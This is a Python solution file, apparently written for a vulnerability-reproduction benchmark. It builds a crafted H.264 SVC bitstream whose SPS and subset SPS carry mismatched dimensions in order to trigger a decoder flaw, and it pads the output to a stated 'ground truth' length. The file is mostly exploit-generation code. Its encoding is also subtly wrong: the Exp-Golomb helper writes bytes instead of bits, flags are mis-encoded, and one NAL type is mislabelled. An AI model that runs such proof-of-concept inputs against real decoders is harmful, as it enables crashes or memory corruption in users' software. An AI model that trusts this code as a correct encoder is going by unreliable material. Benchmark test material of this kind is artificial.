import os
import tempfile
import subprocess
import struct
import hashlib
import tarfile
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the tarball to examine source structure
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r') as tar:
                tar.extractall(tmpdir)
            
            # Look for common video codec structures in extracted files
            # Based on the vulnerability description, we need to create
            # a mismatch between decoder display dimensions and subset sequence dimensions
            # This typically involves creating an SVC (Scalable Video Coding) bitstream
            
            # We'll create a minimal H.264 SVC bitstream with mismatched dimensions
            # Structure: NAL units with SVC extension, dimensions in SPS and subset SPS
            
            poc = self._create_svc_bitstream()
            
            return poc
    
    def _create_svc_bitstream(self) -> bytes:
        """Create an H.264 SVC bitstream with dimension mismatch"""
        # Build a sequence of NAL units
        nal_units = []
        
        # Start with start code prefix
        start_code = b'\x00\x00\x00\x01'
        
        # SVC Subset SPS NAL unit (type 15) - defines sequence dimensions
        subset_sps = self._create_subset_sps()
        nal_units.append(start_code + subset_sps)
        
        # Regular SPS NAL unit (type 7) - defines display dimensions (different from subset)
        sps = self._create_sps_with_mismatch()
        nal_units.append(start_code + sps)
        
        # PPS NAL unit (type 8)
        pps = self._create_pps()
        nal_units.append(start_code + pps)
        
        # SEI NAL unit (type 6) - optional, can help trigger specific code paths
        sei = self._create_sei()
        nal_units.append(start_code + sei)
        
        # Slice NAL unit (type 1) - minimal slice
        slice_data = self._create_slice()
        nal_units.append(start_code + slice_data)
        
        # Pad to target length (6180 bytes as per ground truth)
        bitstream = b''.join(nal_units)
        
        # Add padding to reach exact target length
        # The padding is crafted to look like valid NAL unit data
        padding = self._create_padding(6180 - len(bitstream))
        bitstream += padding
        
        return bitstream
    
    def _create_subset_sps(self) -> bytes:
        """Create Subset SPS with specific dimensions"""
        # NAL header: forbidden_zero_bit=0, nal_ref_idc=3, nal_unit_type=15
        nal_header = 0x8F  # 10001111 in binary
        
        # SPS data structure
        # profile_idc = 83 (SVC profile)
        # constraint_set_flags
        # level_idc
        # seq_parameter_set_id
        # chroma_format_idc = 1 (4:2:0)
        # bit_depth_luma_minus8 = 0
        # bit_depth_chroma_minus8 = 0
        # qpprime_y_zero_transform_bypass_flag = 0
        # seq_scaling_matrix_present_flag = 0
        
        # pic_width_in_mbs_minus1 = 79 (1280 pixels: (79+1)*16 = 1280)
        # pic_height_in_map_units_minus1 = 44 (720 pixels: (44+1)*16 = 720)
        
        sps_data = bytearray()
        
        # Start with Exp-Golomb coded values
        sps_data.extend(self._ue(83))  # profile_idc
        sps_data.extend(self._ue(0))   # constraint_set0_flag
        sps_data.extend(self._ue(0))   # constraint_set1_flag
        sps_data.extend(self._ue(0))   # constraint_set2_flag
        sps_data.extend(self._ue(0))   # constraint_set3_flag
        sps_data.extend(self._ue(0))   # constraint_set4_flag
        sps_data.extend(self._ue(0))   # constraint_set5_flag
        sps_data.append(0)             # reserved_zero_2bits
        sps_data.extend(self._ue(31))  # level_idc
        sps_data.extend(self._ue(0))   # seq_parameter_set_id
        
        # Chroma format
        sps_data.extend(self._ue(1))   # chroma_format_idc
        sps_data.extend(self._ue(0))   # bit_depth_luma_minus8
        sps_data.extend(self._ue(0))   # bit_depth_chroma_minus8
        sps_data.append(0)             # qpprime_y_zero_transform_bypass_flag
        
        # Scaling matrix (not present)
        sps_data.append(0)             # seq_scaling_matrix_present_flag
        
        # Frame parameters
        sps_data.extend(self._ue(4))   # log2_max_frame_num_minus4
        sps_data.extend(self._ue(0))   # pic_order_cnt_type
        sps_data.extend(self._ue(4))   # log2_max_pic_order_cnt_lsb_minus4
        
        # Max reference frames
        sps_data.extend(self._ue(1))   # max_num_ref_frames
        sps_data.append(0)             # gaps_in_frame_num_value_allowed_flag
        
        # Picture dimensions - SUBSET dimensions
        sps_data.extend(self._ue(79))  # pic_width_in_mbs_minus1 (1280 pixels)
        sps_data.extend(self._ue(44))  # pic_height_in_map_units_minus1 (720 pixels)
        
        # Frame characteristics
        sps_data.append(0xFC)          # frame_mbs_only_flag=1, direct_8x8_inference_flag=1
                                       # frame_cropping_flag=0, vui_parameters_present_flag=0
        
        # Add some trailing bits to ensure proper alignment
        sps_data.append(0x80)          # stop bit and padding
        
        # Combine NAL header and SPS data
        result = bytearray([nal_header]) + sps_data
        
        # Add some SVC extension data
        svc_extension = bytearray([
            0x01, 0x00, 0x00, 0x00,  # Some SVC extension flags
            0x4F, 0x00, 0x00, 0x00,  # More SVC data
            0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00
        ])
        result.extend(svc_extension)
        
        return bytes(result)
    
    def _create_sps_with_mismatch(self) -> bytes:
        """Create SPS with different DISPLAY dimensions"""
        # Similar to subset SPS but with different dimensions
        nal_header = 0x67  # 01100111 in binary (type 7, ref_idc=3)
        
        sps_data = bytearray()
        
        # Same basic parameters as subset SPS
        sps_data.extend(self._ue(83))  # profile_idc
        sps_data.extend(self._ue(0))   # constraint_set0_flag
        sps_data.extend(self._ue(0))   # constraint_set1_flag
        sps_data.extend(self._ue(0))   # constraint_set2_flag
        sps_data.extend(self._ue(0))   # constraint_set3_flag
        sps_data.extend(self._ue(0))   # constraint_set4_flag
        sps_data.extend(self._ue(0))   # constraint_set5_flag
        sps_data.append(0)             # reserved_zero_2bits
        sps_data.extend(self._ue(31))  # level_idc
        sps_data.extend(self._ue(0))   # seq_parameter_set_id
        
        # Chroma format
        sps_data.extend(self._ue(1))   # chroma_format_idc
        sps_data.extend(self._ue(0))   # bit_depth_luma_minus8
        sps_data.extend(self._ue(0))   # bit_depth_chroma_minus8
        sps_data.append(0)             # qpprime_y_zero_transform_bypass_flag
        
        # Scaling matrix
        sps_data.append(0)             # seq_scaling_matrix_present_flag
        
        # Frame parameters
        sps_data.extend(self._ue(4))   # log2_max_frame_num_minus4
        sps_data.extend(self._ue(0))   # pic_order_cnt_type
        sps_data.extend(self._ue(4))   # log2_max_pic_order_cnt_lsb_minus4
        
        # Max reference frames
        sps_data.extend(self._ue(1))   # max_num_ref_frames
        sps_data.append(0)             # gaps_in_frame_num_value_allowed_flag
        
        # DISPLAY dimensions - DIFFERENT from subset!
        # This creates the mismatch
        sps_data.extend(self._ue(119))  # pic_width_in_mbs_minus1 (1920 pixels)
        sps_data.extend(self._ue(67))   # pic_height_in_map_units_minus1 (1088 pixels)
        
        # Frame characteristics
        sps_data.append(0xFC)          # frame_mbs_only_flag=1, direct_8x8_inference_flag=1
                                       # frame_cropping_flag=0, vui_parameters_present_flag=0
        
        # Add trailing bits
        sps_data.append(0x80)
        
        result = bytearray([nal_header]) + sps_data
        return bytes(result)
    
    def _create_pps(self) -> bytes:
        """Create Picture Parameter Set"""
        nal_header = 0x68  # 01101000 in binary (type 8, ref_idc=3)
        
        pps_data = bytearray()
        pps_data.extend(self._ue(0))   # pic_parameter_set_id
        pps_data.extend(self._ue(0))   # seq_parameter_set_id
        pps_data.append(0xE0)          # entropy_coding_mode_flag=0, etc.
        pps_data.extend(self._ue(0))   # num_slice_groups_minus1
        pps_data.extend(self._ue(0))   # num_ref_idx_l0_active_minus1
        pps_data.extend(self._ue(0))   # num_ref_idx_l1_active_minus1
        pps_data.append(0)             # weighted_pred_flag=0, weighted_bipred_idc=0
        pps_data.extend(self._ue(0))   # pic_init_qp_minus26
        pps_data.extend(self._ue(0))   # pic_init_qs_minus26
        pps_data.extend(self._ue(0))   # chroma_qp_index_offset
        pps_data.append(0)             # deblocking_filter_control_present_flag=0
        pps_data.append(0)             # constrained_intra_pred_flag=0, redundant_pic_cnt_present_flag=0
        
        return bytes([nal_header]) + pps_data
    
    def _create_sei(self) -> bytes:
        """Create SEI NAL unit"""
        nal_header = 0x06  # 00000110 in binary (type 6, ref_idc=0)
        
        # Simple SEI payload: buffering period
        sei_data = bytearray()
        sei_data.append(0x00)  # payload_type = 0 (buffering period)
        sei_data.append(0x02)  # payload_size = 2
        sei_data.append(0x00)  # sei data
        sei_data.append(0x00)
        
        # Stop bit
        sei_data.append(0x80)
        
        return bytes([nal_header]) + sei_data
    
    def _create_slice(self) -> bytes:
        """Create a minimal slice"""
        nal_header = 0x21  # 00100001 in binary (type 1, ref_idc=0, IDR slice)
        
        slice_data = bytearray()
        
        # First_mb_in_slice
        slice_data.extend(self._ue(0))
        
        # Slice_type (I slice)
        slice_data.extend(self._ue(7))
        
        # Pic_parameter_set_id
        slice_data.extend(self._ue(0))
        
        # Frame_num
        for _ in range(4):  # 4 bits of frame_num (log2_max_frame_num_minus4 = 4)
            slice_data.append(0)
        
        # IDR pic id
        slice_data.extend(self._ue(0))
        
        # Pic_order_cnt_lsb
        for _ in range(4):  # 4 bits of poc
            slice_data.append(0)
        
        # Dec_ref_pic_marking (for IDR)
        slice_data.append(0x80)  # no_output_of_prior_pics_flag=0, long_term_reference_flag=0
        
        # Slice_qp_delta
        slice_data.extend(self._ue(0))
        
        # Some macroblock data
        slice_data.append(0x00)
        slice_data.append(0x00)
        
        return bytes([nal_header]) + slice_data
    
    def _create_padding(self, length: int) -> bytes:
        """Create padding that looks like valid NAL unit data"""
        if length <= 0:
            return b''
        
        padding = bytearray()
        
        # Create filler NAL units (type 12)
        while len(padding) < length:
            remaining = length - len(padding)
            if remaining >= 4:
                # Add start code + filler NAL
                padding.extend(b'\x00\x00\x00\x01')  # start code
                padding.append(0x0C)  # filler NAL header
                filler_size = min(remaining - 5, 255)
                if filler_size > 0:
                    padding.extend(bytes([0xFF] * filler_size))
            else:
                # Just pad with zeros
                padding.extend(bytes([0x00] * remaining))
        
        return bytes(padding[:length])
    
    def _ue(self, value: int) -> bytes:
        """Encode unsigned Exp-Golomb code"""
        value += 1
        bits = value.bit_length()
        leading_zeros = bits - 1
        
        result = bytearray()
        # Write leading zeros as 1 bits in bytes
        full_bytes = leading_zeros // 8
        for _ in range(full_bytes):
            result.append(0x00)
        
        remaining_bits = leading_zeros % 8
        if remaining_bits > 0:
            result.append(0x00)
        
        # Write the value
        value_bits = bits
        while value_bits > 0:
            bits_to_write = min(8, value_bits)
            byte_val = (value >> (value_bits - bits_to_write)) & ((1 << bits_to_write) - 1)
            if value_bits == bits:
                # First byte of value, set MSB to 1
                byte_val |= (1 << bits_to_write)
            result.append(byte_val)
            value_bits -= bits_to_write
        
        return bytes(result)